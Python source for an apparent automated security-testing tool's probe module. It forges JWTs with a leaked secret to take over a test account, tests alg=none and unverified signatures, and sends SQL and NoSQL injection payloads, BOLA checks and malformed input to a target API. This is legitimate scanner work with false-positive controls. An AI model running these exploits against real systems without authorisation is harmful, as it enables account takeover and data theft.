"""
execution/probes.py — Active exploit probes
============================================
QAX's runner could only send HTTP requests and click UI. Some bugs need MORE than
that to prove — forging a token with a leaked secret, or crashing an endpoint with
oversized input. Probes are that broader execution vocabulary: each actively tries
an exploit and returns hard evidence when it works.

The crown jewel is forge_jwt: it signs a JWT with the secret the AppModel found
hardcoded in config and uses it to impersonate a freshly-registered victim — the
critical bug QAX was structurally unable to reach. Signing is pure stdlib HMAC (no
new dependency), covering the symmetric HS256/384/512 algorithms a hardcoded secret
implies.

All probes are best-effort and never raise to the caller.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
import uuid

import requests

from services.results import ProbeFinding

logger = logging.getLogger(__name__)

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
    """Sign a JWT with an HMAC (symmetric) algorithm using only the stdlib."""
    hasher = _HASHES.get((algorithm or "HS256").upper())
    if hasher is None:
        return None
    header = _b64(json.dumps({"alg": algorithm.upper(), "typ": "JWT"},
                             separators=(",", ":")).encode())
    payload = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64(hmac.new(secret.encode(), signing_input, hasher).digest())
    return (signing_input + b"." + sig).decode()


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _jwt_payload_segment(token: str):
    """(parts, payload_dict) for a well-formed JWT, else None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return parts, json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None


def jwt_flaws_probe(model, base_url: str, *, session: requests.Session | None = None,
                    auth: dict | None = None) -> list[ProbeFinding]:
    """
    Deep JWT-validation flaws, proven with a CONTROL. Needs a VALID token (supplied
    or self-registered) and a protected endpoint where valid→2xx and no-token→401.
    Then it tampers the valid token and checks the endpoint still accepts it:
      • header alg=none + empty signature accepted → the algorithm isn't enforced (P1).
      • a garbage signature accepted → the signature isn't verified at all (P1).
    A correct server (algorithms=[HS256], signature+exp checked) rejects both → quiet.
    No secret needed — this catches bugs forge-jwt (which needs a leaked secret) can't.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    target = next((str(e.get("path")) for e in getattr(model, "endpoints", [])
                   if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                   and e.get("auth_required") and "{" not in str(e.get("path", ""))), None)
    target = target or recipe.get("identity_path")
    if not target:
        return out
    token = _resolve_token(sess, base, recipe, model, f"jwtf_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
    if not token:
        return out
    url = f"{base}{target}"

    def code_with(tok):
        try:
            return sess.get(url, headers=_auth_headers(tok, auth), timeout=15).status_code
        except Exception:
            return None

    try:
        s_notoken = sess.get(url, timeout=15).status_code
    except Exception:
        return out
    s_valid = code_with(token)
    # Controls: the valid token must work AND the endpoint must reject no token.
    if not (isinstance(s_valid, int) and 200 <= s_valid < 300):
        return out
    if s_notoken not in (401, 403):
        return out

    parsed = _jwt_payload_segment(token)
    if not parsed:
        return out
    parts = parsed[0]

    none_header = _b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()).decode()
    alg_none = f"{none_header}.{parts[1]}."
    c = code_with(alg_none)
    if isinstance(c, int) and 200 <= c < 300:
        out.append(ProbeFinding(
            probe="jwt-flaws", title=f"JWT alg=none accepted — authentication bypass on GET {target}",
            exploited=True, severity="P1",
            evidence=(f"A token with header alg=none and NO signature was accepted (HTTP {c}, same as a "
                      f"valid token; no token → {s_notoken}). The server does not enforce the signing "
                      f"algorithm — anyone can forge a valid session."),
            target=target))

    tampered = f"{parts[0]}.{parts[1]}.{'A' * max(10, len(parts[2]))}"
    c = code_with(tampered)
    if isinstance(c, int) and 200 <= c < 300:
        out.append(ProbeFinding(
            probe="jwt-flaws", title=f"JWT signature not verified — any token forgeable on GET {target}",
            exploited=True, severity="P1",
            evidence=(f"A token with a garbage signature was accepted (HTTP {c}; no token → {s_notoken}). "
                      f"The server does not verify the signature — tokens can be forged at will."),
            target=target))
    return out


def _jwt_algorithm(model) -> str:
    """Read the JWT algorithm from the model's config, defaulting to HS256."""
    for c in getattr(model, "config", []):
        if isinstance(c, dict) and "algorithm" in str(c.get("key", "")).lower():
            return str(c.get("default") or "HS256")
    return "HS256"


def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = None) -> ProbeFinding | None:
    """
    Try to forge a JWT with the hardcoded secret and impersonate a victim.

    Returns a ProbeFinding (exploited=True on success), or None when there is no
    hardcoded secret to forge with.
    """
    sess = session or requests.Session()

    secret = None
    for s in getattr(model, "exposed_secrets", []):
        if any(k in str(s.get("key", "")).lower() for k in ("jwt", "secret", "sign", "token", "key")):
            secret = s.get("default")
            break
    if not secret:
        return None

    algorithm = _jwt_algorithm(model)
    if not algorithm.upper().startswith("HS"):
        return ProbeFinding(probe="forge-jwt", title="JWT uses an asymmetric algorithm",
                            exploited=False, severity="P1",
                            evidence=f"algorithm {algorithm} — a config secret is not the signing key",
                            target="auth")

    from core.auth_recipe import derive_auth_recipe, register_body, subject_candidates
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    identity = recipe["identity_path"]
    base = base_url.rstrip("/")
    victim = f"victim_{uuid.uuid4().hex[:8]}@example.com"

    reg_response = None
    try:
        rr = sess.post(f"{base}{register}",
                       json=register_body(recipe, model, victim, password="Str0ngPass!23"),
                       timeout=15)
        try:
            reg_response = rr.json()
        except Exception:
            reg_response = None
    except Exception as exc:  # pragma: no cover - network
        logger.warning("forge_jwt: victim register failed: %s", exc)

    exp = int(time.time()) + 3600
    for sub in subject_candidates(victim, reg_response):
        token = sign_jwt_hs(secret, algorithm, {"sub": sub, "exp": exp})
        if not token:
            continue
        try:
            r = sess.get(f"{base}{identity}", headers={"Authorization": f"Bearer {token}"}, timeout=15)
        except Exception as exc:  # pragma: no cover - network
            logger.warning("forge_jwt: identity call failed: %s", exc)
            continue
        if r.status_code == 200 and victim in r.text:
            return ProbeFinding(
                probe="forge-jwt",
                title="JWT forgery → full account takeover",
                exploited=True, severity="P1",
                evidence=(f"Forged a token for {victim} with the hardcoded secret "
                          f"{str(secret)[:24]!r} (alg {algorithm}); GET {identity} returned 200 with "
                          f"the victim's data — no password needed."),
                target=identity)

    return ProbeFinding(probe="forge-jwt", title="JWT forgery attempt did not succeed",
                        exploited=False, severity="P1",
                        evidence="forged token was rejected (secret/subject/alg did not match)",
                        target=identity)


_SQL_ERRORS = ("sql syntax", "sqlite3", "operationalerror", "sqlalchemy",
               "unrecognized token", "syntax error", "psycopg2", "you have an error in your sql",
               "unterminated", "near \"", "programmingerror")


_ID_KW = ("email", "username", "login", "phone", "mobile", "msisdn", "user")
_SECRET_KW = ("password", "passwd", "pwd", "secret", "pin", "pass")


def _auth_token(sess, base, recipe, model, identity, password="Secret123!"):
    """
    Register `identity` then log in and return a bearer token (or None).

    The login body is built from the LOGIN endpoint's OWN request fields — not the
    register id field — because an app can register with one identifier (email) and
    log in with another (username). The value reused is whatever the register body
    put in that same field, so the two always match.
    """
    from core.auth_recipe import field_names, register_body
    reg_body = register_body(recipe, model, identity, password=password)
    try:
        sess.post(f"{base}{recipe['register_path']}", json=reg_body, timeout=15)
    except Exception:
        return None

    login_fields: list[str] = []
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("path", "")) == recipe["login_path"]
                and str(e.get("method", "")).upper() == "POST"):
            login_fields = field_names(e.get("request_fields"))
            break
    id_field = next((f for f in login_fields if any(k in f.lower() for k in _ID_KW)), recipe["id_field"])
    sec_field = next((f for f in login_fields if any(k in f.lower() for k in _SECRET_KW)), recipe["secret_field"])
    id_value = reg_body.get(id_field, identity)
    login_url = f"{base}{recipe['login_path']}"

    # 1) JSON login (FastAPI/Flask-RESTX/connexion style).
    try:
        lr = sess.post(login_url, json={id_field: id_value, sec_field: password}, timeout=15)
        tok = _extract_token(lr, recipe)
        if tok:
            return tok
    except Exception:
        pass
    # 2) OAuth2 form login (OAuth2PasswordRequestForm): x-www-form-urlencoded with the
    #    literal fields `username`/`password`. Common on FastAPI apps — without this
    #    QAX can't get a token there and every auth'd probe silently skips.
    try:
        lr = sess.post(login_url, data={"username": id_value, "password": password}, timeout=15)
        return _extract_token(lr, recipe)
    except Exception:
        return None


def _extract_token(response, recipe):
    """Pull a bearer token out of a login response (recipe field, then any token-ish key)."""
    try:
        if response.status_code >= 400:
            return None
        data = response.json()
    except Exception:
        return None
    if not isinstance(data, dict):
        return None
    tok = data.get(recipe["token_field"])
    if tok:
        return tok
    for k, v in data.items():
        if isinstance(v, str) and any(t in k.lower() for t in ("token", "jwt", "access", "auth")):
            return v
    return None


def _auth_headers(token, auth: dict | None = None) -> dict:
    """Build the auth header for a token, honouring a supplied header name/scheme."""
    if not token:
        return {}
    auth = auth or {}
    header = auth.get("header") or "Authorization"
    scheme = auth.get("scheme", "Bearer") if "scheme" in auth else "Bearer"
    value = f"{scheme} {token}".strip() if scheme else str(token)
    return {header: value}


def _resolve_token(sess, base, recipe, model, identity, *, auth: dict | None = None, slot: str = "primary"):
    """
    Get a bearer token for a probe. Prefer a token SUPPLIED by the caller (so apps
    that issue tokens outside a register/login flow — external IdP, offline-signed
    JWT, API key — can still be exercised); otherwise self-register + login.
    `slot` picks which supplied token: 'primary' (user A) or 'secondary' (user B).
    """
    auth = auth or {}
    if slot == "secondary" and auth.get("token_b"):
        return auth["token_b"]
    if slot == "primary" and auth.get("token"):
        return auth["token"]
    return _auth_token(sess, base, recipe, model, identity)


def bola_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    Broken Object-Level Authorization via a TWO-USER control experiment.

    User A creates an object carrying a unique secret marker; user B then reads it
    by its key. If B's read returns 2xx WITH A's marker, there is no ownership check
    — B read A's private object. A reading its own object first is the control that
    proves the object and endpoint are valid (so a failure to create isn't misread).
    When the app is safe, B gets a 404 and nothing is flagged.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # Pair each auth-required "read by key" GET with the POST that creates into the
    # same collection, and find which body field is the object's key.
    pairs = []
    for ge in eps:
        if str(ge.get("method", "")).upper() != "GET" or not ge.get("auth_required"):
            continue
        gp = str(ge.get("path", ""))
        m = re.search(r"\{([^}]+)\}", gp)
        if not m:
            continue
        param = m.group(1)
        prefix = gp[:m.start()].rstrip("/")
        post = next((e for e in eps if str(e.get("method", "")).upper() == "POST"
                     and str(e.get("path", "")).rstrip("/") == prefix
                     and field_names(e.get("request_fields"))), None)
        if not post:
            continue
        pf = field_names(post.get("request_fields"))
        key_field = next((f for f in pf if f.lower() == param.lower()), None) \
            or next((f for f in pf if any(k in f.lower() for k in ("title", "name", "id", "slug", "key"))), None)
        if key_field:
            pairs.append((post, ge, prefix, param, key_field, pf))
    if not pairs:
        return out

    ta = _resolve_token(sess, base, recipe, model, f"bola_a_{uuid.uuid4().hex[:8]}@example.com",
                        auth=auth, slot="primary")
    tb = _resolve_token(sess, base, recipe, model, f"bola_b_{uuid.uuid4().hex[:8]}@example.com",
                        auth=auth, slot="secondary")
    if not ta or not tb:
        return out

    _CONTENT_KW = ("secret", "content", "body", "data", "value", "text", "note", "description", "payload")
    for post, ge, prefix, param, key_field, pf in pairs[:4]:
        key = f"qaxbola{uuid.uuid4().hex[:10]}"
        marker = f"qaxmarker{uuid.uuid4().hex[:12]}"
        body: dict = {}
        for f in pf:
            lf = f.lower()
            if f == key_field:
                body[f] = key
            elif any(k in lf for k in _CONTENT_KW):
                body[f] = marker
            elif any(k in lf for k in _SECRET_KW):
                body[f] = "Secret123!"
            elif any(k in lf for k in ("age", "count", "number", "qty")):
                body[f] = 1
            else:
                body[f] = "test"
        if marker not in str(body):  # make sure a detectable secret is present
            placed = next((f for f in pf if f != key_field), None)
            if not placed:
                continue  # key-only resource: nothing private to leak, can't prove
            body[placed] = marker

        auth_a = _auth_headers(ta, auth)
        auth_b = _auth_headers(tb, auth)
        try:
            cr = sess.post(f"{base}{prefix}", json=body, headers=auth_a, timeout=15)
            if cr.status_code >= 400:
                continue
            read_path = f"{base}{str(ge['path']).replace('{' + param + '}', key)}"
            ar = sess.get(read_path, headers=auth_a, timeout=15)
            if ar.status_code >= 400:  # control: A must be able to read its own object
                continue
            br = sess.get(read_path, headers=auth_b, timeout=15)
        except Exception:
            continue
        if br.status_code < 300 and marker in (br.text or ""):
            out.append(ProbeFinding(
                probe="bola", title=f"Broken object-level authorization in GET {ge['path']}",
                exploited=True, severity="P1",
                evidence=(f"User B read user A's object (key '{key}') via {ge['path']}: B's request "
                          f"returned {br.status_code} containing A's private content. The endpoint "
                          f"has no ownership check — any authenticated user can read any object."),
                target=str(ge["path"])))
    return out


def sqli_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    Error-based SQL injection with a CONTROL: a benign value vs the same value with
    a single quote. If the quote breaks the query (5xx or a SQL error in the body)
    while the benign value is fine, the input reaches a raw query — injection.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and "{" in str(e.get("path", ""))]
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"sqli_{uuid.uuid4().hex[:8]}@example.com", auth=auth)

    for e in cands[:5]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        param = m.group(1)
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}

        def send(value, _p=path, _pr=param, _h=headers):
            try:
                r = sess.get(f"{base}{_p.replace('{' + _pr + '}', str(value))}", headers=_h, timeout=15)
                return r.status_code, r.text
            except Exception:
                return None, ""

        f = _detect_injection(send, method=str(e.get("method", "GET")), path=path,
                              where=f"path param '{param}'")
        if f:
            out.append(f)
    return out


# Payloads that break out of a string literal in either quote style, and boolean
# tautologies for a differential (row-count) proof (QA knowledge base sec 1.6).
_QUOTES = ('"', "'")


def _detect_injection(send, *, method: str, path: str, where: str) -> ProbeFinding | None:
    """
    Confirm SQL injection from a `send(value) -> (status, body)` closure, with a
    control. Two independent proofs, either is enough:
      • error-based: a quote (either style) yields a SQL error in the body → P1.
      • boolean-based: a TRUE tautology returns far more data than both the benign
        value and a matched FALSE tautology → the WHERE clause was bypassed → P1.
    A 5xx with no SQL error text is reported as P3 robustness only (not proof —
    don't cry wolf). Benign already 5xx = no clean signal.
    """
    def ask(value):
        # A 5xx can reset a keep-alive connection, so the FOLLOWING request on a
        # shared session errors (status None). Retry once to re-establish it.
        s, b = send(value)
        if s is None:
            s, b = send(value)
        return s, b

    sb, bb = ask("qaxprobe1")
    if sb is None or sb >= 500:
        return None
    nben = len(bb or "")
    p3: ProbeFinding | None = None
    for q in _QUOTES:
        # Boolean-differential FIRST (both payloads are valid SQL → 200, no 5xx to
        # reset the connection): a TRUE tautology returning far more data than a
        # matched FALSE one and the benign value = the WHERE clause was bypassed.
        st_t, bt_t = ask(f"qaxprobe1{q} OR {q}1{q}={q}1")
        st_f, bt_f = ask(f"qaxprobe1{q} OR {q}1{q}={q}2")
        if (st_t == 200 and st_f == 200 and bt_t is not None and bt_f is not None
                and len(bt_t) > max(len(bt_f), nben) * 2 + 20):
            return ProbeFinding(
                probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                exploited=True, severity="P1",
                evidence=(f"Boolean injection in {where}: a TRUE tautology returned far more data "
                          f"({len(bt_t)}B) than a matched FALSE one ({len(bt_f)}B) or the benign value "
                          f"({nben}B) — the WHERE clause was bypassed."),
                target=path)
        # Then error-based: a quote that yields a SQL error = confirmed (P1); a bare
        # 5xx = robustness lead only (P3 — not proof, don't cry wolf).
        st, bt = ask("qaxprobe1" + q)
        if st is not None and st >= 500:
            if any(s in (bt or "").lower() for s in _SQL_ERRORS):
                return ProbeFinding(
                    probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                    exploited=True, severity="P1",
                    evidence=(f"A {q} in {where} produced a SQL error (benign → {sb}, payload → {st}). "
                              f"The input reaches a raw, unparameterized query."),
                    target=path)
            p3 = p3 or ProbeFinding(
                probe="input-robustness",
                title=f"Unhandled 500 on injection-style input in {method} {path} ({where})",
                exploited=True, severity="P3",
                evidence=(f"A {q} in {where} caused HTTP {st} (benign → {sb}) with NO SQL error text. "
                          f"Likely injection or input-handling; NOT confirmed — reported low and separately."),
                target=path)
    return p3


_DATE_KW = ("time", "date", "_at", "timestamp", "expir", "start", "end", "dob",
            "created", "updated", "scheduled", "deadline", "dateofbirth")


def _benign_body(fields: list[str]) -> dict:
    """A type-plausible benign body (by field-name heuristic) that should pass validation."""
    body: dict = {}
    for f in fields:
        lf = f.lower()
        if "email" in lf:
            body[f] = "qaxprobe1@example.com"
        elif any(k in lf for k in _DATE_KW):
            body[f] = "2020-01-01T00:00:00"          # a valid ISO datetime baseline
        elif any(k in lf for k in ("age", "count", "number", "qty", "amount", "price", "id")):
            body[f] = 1
        elif any(k in lf for k in ("is_", "enabled", "active", "admin", "approved")):
            body[f] = False
        else:
            body[f] = "qaxprobe1"
    return body


def _stringy(field: str, value) -> bool:
    """A field worth quote-fuzzing for SQLi: a plain text string (not email/date)."""
    if not isinstance(value, str):
        return False
    lf = field.lower()
    return "email" not in lf and not any(k in lf for k in _DATE_KW)


def malformed_input_probe(model, base_url: str, *, session: requests.Session | None = None,
                          auth: dict | None = None) -> list[ProbeFinding]:
    """
    Unhandled-500 / debug disclosure from MALFORMED (type-violating) input — the bug
    class a messy app ships: a value the server parses without a try/except
    (datetime.fromisoformat, int(), json.loads, UUID…). Posts a VALID baseline body,
    then sets one field at a time to garbage and watches for a 5xx:
      • a 5xx whose body shows an interactive debugger → P1 (debug mode on / RCE risk).
      • a 5xx whose body shows a stack trace → P2 (source/stack disclosure).
      • a plain 5xx → P2 (input not validated — unhandled server error).
    Control: the baseline must be < 500. POST/PUT/PATCH only (never DELETE).
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    _tok = {"v": None}

    def headers_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"mal_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        return _auth_headers(_tok["v"], auth)

    for e in [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")
              and field_names(x.get("request_fields"))][:6]:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = headers_for(e)
        fields = field_names(e.get("request_fields"))
        benign = _benign_body(fields)
        try:
            rb = sess.request(method, f"{base}{path}", json=benign, headers=headers, timeout=15)
        except Exception:
            continue
        if rb.status_code >= 500 or rb.status_code >= 400:
            continue  # baseline must be accepted, else we can't attribute a later 5xx
        for fld in fields[:6]:
            bad = dict(benign, **{fld: "qax-not-a-valid-value-!@#"})
            try:
                r = sess.request(method, f"{base}{path}", json=bad, headers=headers, timeout=15)
            except Exception:
                continue
            if r.status_code < 500:
                continue
            body = (r.text or "").lower()
            if any(s in body for s in _DEBUG_INTERACTIVE):
                sev, kind = "P1", "Debug mode / interactive debugger exposed"
            elif any(s in body for s in _DEBUG_TRACE):
                sev, kind = "P2", "Stack trace disclosed"
            else:
                sev, kind = "P2", "Unhandled server error (input not validated)"
            out.append(ProbeFinding(
                probe="malformed-input",
                title=f"{kind} on {method} {e.get('path')} (field '{fld}')",
                exploited=True, severity=sev,
                evidence=(f"A valid body returned {rb.status_code}, but setting '{fld}' to a "
                          f"type-violating value returned HTTP {r.status_code}"
                          + (" exposing an interactive debugger" if sev == "P1" else
                             " with a stack trace/internals" if kind.startswith("Stack") else
                             " — the value is parsed without validation")
                          + ". Malformed input must be rejected with a 4xx."),
                target=str(e.get("path", ""))))
            break  # one finding per endpoint is enough
    return out


def injection_probe(model, base_url: str, *, session: requests.Session | None = None,
                    auth: dict | None = None) -> list[ProbeFinding]:
    """
    SQL injection via QUERY parameters and request-BODY fields (the path-param case
    is sqli_probe). Uses the same error-based + boolean-differential control. Query
    fuzzing is GET-only (idempotent); body fuzzing is POST/PUT/PATCH only (never
    DELETE — a body on DELETE could destroy data). Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    _tok = {"v": None}

    def token_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"inj_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        return _auth_headers(_tok["v"], auth)

    # Query-param injection — GET only (safe to repeat).
    for e in [x for x in eps if str(x.get("method", "")).upper() == "GET" and x.get("query_params")][:6]:
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        qps = list(e.get("query_params") or [])
        for qp in qps[:3]:
            def send(value, _qp=qp, _h=headers, _p=path):
                params = {p: "qaxprobe1" for p in qps}
                params[_qp] = value
                try:
                    r = sess.get(f"{base}{_p}", params=params, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            f = _detect_injection(send, method="GET", path=str(e.get("path", "")),
                                  where=f"query param '{qp}'")
            if f:
                out.append(f)

    # Body-field injection — POST/PUT/PATCH only (never DELETE).
    for e in [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")
              and field_names(x.get("request_fields"))][:6]:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        fields = field_names(e.get("request_fields"))
        benign = _benign_body(fields)
        for fld in [f for f in fields if _stringy(f, benign.get(f))][:3]:
            def send(value, _fld=fld, _h=headers, _p=path, _m=method):
                body = dict(benign, **{_fld: value})
                try:
                    r = sess.request(_m, f"{base}{_p}", json=body, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            f = _detect_injection(send, method=method, path=str(e.get("path", "")),
                                  where=f"body field '{fld}'")
            if f:
                out.append(f)
    return out


_NOSQL_ERRORS = ("pymongo", "montydb", "bson", "mongoerror", "mongoclient",
                 "unknown operator", "invaliddocument", "cannot encode", "$where")


def nosql_probe(model, base_url: str, *, session: requests.Session | None = None,
                auth: dict | None = None) -> list[ProbeFinding]:
    """
    NoSQL (operator) injection on write endpoints whose body feeds a document query.
    Control: a plain string value vs a Mongo OPERATOR OBJECT in the same field.
      • confirmed (P1): a TRUE operator ({"$ne": <nomatch>}) returns 200 with far
        more data than the benign value and a matched FALSE operator ({"$eq":
        <nomatch>}) — the filter was bypassed; OR the response carries a NoSQL
        error signature.
      • lead (P3): the operator object only triggers a generic 5xx (reaches the
        query engine but we can't prove a bypass — not confirmed, don't cry wolf).
    Candidate field names come from the body schema and from query params of the
    same path (apps like vfapi read a raw JSON body keyed like their GET filter).
    POST/PUT/PATCH only (never DELETE). Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # path -> query-param names seen on ANY method (a raw-body POST often keys by them)
    path_qps: dict = {}
    for e in eps:
        p = str(e.get("path", ""))
        path_qps.setdefault(p, [])
        for qp in (e.get("query_params") or []):
            if qp not in path_qps[p]:
                path_qps[p].append(qp)

    _tok = {"v": None}

    def token_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"nosql_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        return _auth_headers(_tok["v"], auth)

    for e in [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")][:6]:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        fields = field_names(e.get("request_fields"))
        keys = list(fields) + [k for k in path_qps.get(str(e.get("path", "")), []) if k not in fields]
        if not keys:
            continue
        others = _benign_body(fields)
        for key in keys[:3]:
            def send(value, _k=key, _h=headers, _p=path, _m=method):
                body = dict(others, **{_k: value})
                try:
                    r = sess.request(_m, f"{base}{_p}", json=body, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            def ask(value):
                s, b = send(value)
                if s is None:
                    s, b = send(value)
                return s, b

            sb, bb = ask("qaxprobe1")
            if sb is None or sb >= 500:
                continue
            nben = len(bb or "")
            st, bt = ask({"$ne": "qax_nomatch_zzz"})
            sf, bf = ask({"$eq": "qax_nomatch_zzz"})
            where = f"body field '{key}'"
            if st == 200 and sf == 200 and bt is not None and bf is not None \
                    and len(bt) > max(len(bf), nben) * 2 + 20:
                out.append(ProbeFinding(
                    probe="nosql", title=f"NoSQL injection in {method} {str(e.get('path',''))} ({where})",
                    exploited=True, severity="P1",
                    evidence=(f"A query operator in {where} bypassed the filter: a TRUE operator "
                              f"returned far more data ({len(bt)}B) than a matched FALSE one ({len(bf)}B) "
                              f"or the benign value ({nben}B)."),
                    target=str(e.get("path", ""))))
            elif st is not None and st >= 500:
                if any(s in (bt or "").lower() for s in _NOSQL_ERRORS):
                    out.append(ProbeFinding(
                        probe="nosql", title=f"NoSQL injection in {method} {str(e.get('path',''))} ({where})",
                        exploited=True, severity="P1",
                        evidence=(f"A query operator in {where} produced a NoSQL/driver error (benign → "
                                  f"{sb}, operator → {st}); the raw body reaches the document query."),
                        target=str(e.get("path", ""))))
                else:
                    out.append(ProbeFinding(
                        probe="nosql-lead",
                        title=f"Operator object rejected with 500 in {method} {str(e.get('path',''))} ({where})",
                        exploited=True, severity="P3",
                        evidence=(f"A Mongo operator object in {where} caused HTTP {st} while a plain "
                                  f"string was accepted ({sb}) — the body may feed a document query "
                                  f"(possible NoSQL injection), NOT confirmed. Reported low and separately."),
                        target=str(e.get("path", ""))))
    return out


# Field names that must NEVER appear in a response body — a credential or secret
# in output is an exposure regardless of auth. Token-family names are deliberately
# excluded: a login returning an access_token is the expected, correct behaviour.
_SENSITIVE_OUT = ("password", "passwd", "pwd", "secret", "private_key", "privatekey",
                  "ssn", "social_security", "credit_card", "creditcard", "card_number",
                  "cardnumber", "cvv", "cvc", "salt", "password_hash", "pwd_hash")


def _sensitive_keys(data, found: set | None = None) -> set:
    """Recursively collect response keys that name a credential/secret with a value."""
    found = found if found is not None else set()
    if isinstance(data, dict):
        for k, v in data.items():
            kl = str(k).lower()
            if any(s in kl for s in _SENSITIVE_OUT) and v not in (None, "", [], {}):
                found.add(str(k))
            _sensitive_keys(v, found)
    elif isinstance(data, list):
        for item in data:
            _sensitive_keys(item, found)
    return found


def excessive_data_probe(model, base_url: str, *, session: requests.Session | None = None,
                         auth: dict | None = None) -> list[ProbeFinding]:
    """
    Excessive Data Exposure: fetch each GET endpoint and inspect the LIVE response
    body (not the spec — nested secrets don't show as top-level fields) for keys
    that should never be returned. A credential in output, especially on an
    unauthenticated endpoint, is the finding. Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    gets = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"]
    token = None
    seen: set = set()
    for e in gets[:12]:
        path = str(e.get("path", ""))
        resolved = re.sub(r"\{[^}]+\}", "qaxprobe1", path)
        if resolved in seen:
            continue
        seen.add(resolved)
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"ede_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            if not token:
                continue
            headers = _auth_headers(token, auth)
        try:
            r = sess.get(f"{base}{resolved}", headers=headers, timeout=15)
            if r.status_code >= 400:
                continue
            data = r.json()
        except Exception:
            continue
        hits = _sensitive_keys(data)
        if hits:
            public = not e.get("auth_required")
            out.append(ProbeFinding(
                probe="excessive-data",
                title=f"Excessive data exposure in GET {path}",
                exploited=True, severity="P1" if public else "P2",
                evidence=(f"The response exposes sensitive field(s) {sorted(hits)} "
                          + ("with NO authentication required" if public
                             else "to any authenticated user")
                          + f" (HTTP {r.status_code}). Credentials/secrets must never be returned."),
                target=path))
    return out


def cookie_flags_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Cookie hardening (QA knowledge base sec 1.3): a cookie set at login should carry
    HttpOnly (and Secure over HTTPS). Reads the raw Set-Cookie header(s) from the
    register/login responses. Bearer-token APIs (no cookies) no-op cleanly, so this
    only speaks when there is a real cookie to judge — low false positives. No model calls.
    """
